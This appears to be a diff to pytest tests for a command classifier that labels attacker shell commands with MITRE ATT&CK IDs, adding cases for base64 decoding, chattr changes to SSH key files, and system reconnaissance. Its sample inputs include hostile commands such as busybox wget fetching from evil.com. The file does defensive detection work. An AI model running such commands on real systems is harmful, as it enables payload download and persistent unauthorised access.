@@ -38,6 +38,8 @@ class TestClassifyCommand:
         ("/tmp/.hidden", "T1059.004"),
         ("busybox wget http://evil.com/a", "T1105"),
         ("busybox tftp evil.com", "T1105"),
+        ("echo aGVsbG8= | base64 -d", "T1027"),
+        ("base64 --decode payload.b64", "T1027"),
     ])
     def test_malware_deployment(self, cmd, mitre):
         intent, mitre_id = classify_command(cmd)
@@ -56,6 +58,9 @@ class TestClassifyCommand:
         ("disown %1", "T1053"),
         ("echo '/tmp/x' >> /etc/rc.local", "T1037"),
         ("systemctl enable evil.service", "T1037"),
+        ("chattr -ia /root/.ssh", "T1098.004"),
+        ("chattr -i ~/.ssh/authorized_keys", "T1098.004"),
+        ("lockr -ia /root/.ssh", "T1098.004"),
     ])
     def test_persistence(self, cmd, mitre):
         intent, mitre_id = classify_command(cmd)
@@ -115,11 +120,42 @@ class TestClassifyCommand:
         ("ls /", "T1083"),
         ("pwd", "T1083"),
         ("find / -name '*.conf'", "T1083"),
+        ("lscpu", "T1082"),
+        ("nproc", "T1082"),
+        ("cat /proc/uptime", "T1082"),
+        ("cat /proc/meminfo", "T1082"),
+        ("uptime", "T1082"),
+        ("ssh -V", "T1082"),
+        ('echo -e "\\x6F\\x6B"', "T1082"),
+        ("/ip cloud print", "T1082"),
+        ("/system resource print", "T1082"),
+        ("which gcc", "T1083"),
+        ("command -v python3", "T1083"),
+        ("for d in $HOME /tmp /var/tmp /dev/shm; do echo $d; done", "T1083"),
+        ("history", "T1552.003"),
+        ("history | tail", "T1552.003"),
+        ("env", "T1082"),
+        ("env | grep PATH", "T1082"),
     ])
     def test_reconnaissance(self, cmd, mitre):
         intent, mitre_id = classify_command(cmd)
         assert intent == "reconnaissance"
         assert mitre_id == mitre
+
+    # -- Word-boundary regressions: substrings must not trigger rules --
+    @pytest.mark.parametrize("cmd", [
+        ("echo droid"),          # "id" inside a word
+        ("echo rapid fire"),     # "id" inside a word
+        ("grep -w root foo"),    # "-w" flag is not the "w" command
+        ("echo tools list"),     # "ls" inside a word
+        ("echo blast off"),      # "last" inside a word
+    ])
+    def test_substrings_do_not_match(self, cmd):
+        intent, _ = classify_command(cmd)
+        assert intent == "unknown"
+
+    def test_bare_ls_is_reconnaissance(self):
+        assert classify_command("ls") == ("reconnaissance", "T1083")
 
     # -- Unknown / default --
     def test_unknown_empty_string(self):
